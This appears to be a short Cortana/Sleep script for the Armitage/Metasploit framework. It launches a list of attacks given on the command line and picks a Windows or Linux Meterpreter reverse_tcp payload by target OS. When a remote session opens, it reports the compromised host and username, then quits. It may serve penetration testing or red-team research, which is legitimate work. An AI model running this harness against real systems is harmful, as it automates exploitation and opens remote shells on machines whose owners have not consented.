debug (7 | 24)

on ready {

}

command cmdline_arg {
   local('$counter @attacks');

   $counter = $1;
   @attacks = split(',' $2);
   
   println(@attacks);
   fire_event_local("launch_attacks", $counter, @attacks);
}

sub determinePayload {
   if ($1 == "windows") {
	return "windows/meterpreter/reverse_tcp";
   }
   return "linux/x86/meterpreter/reverse_tcp";
}

on session_open {
   local('$flag $host $user $sessionNum %r');
   %r = $2;
   $flag = "success";
   #println("Session open: $1 => $2");
   $sessionNum = $1;
   $host = %r["host"];
   $user = %r["username"];
   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
   quit();
}

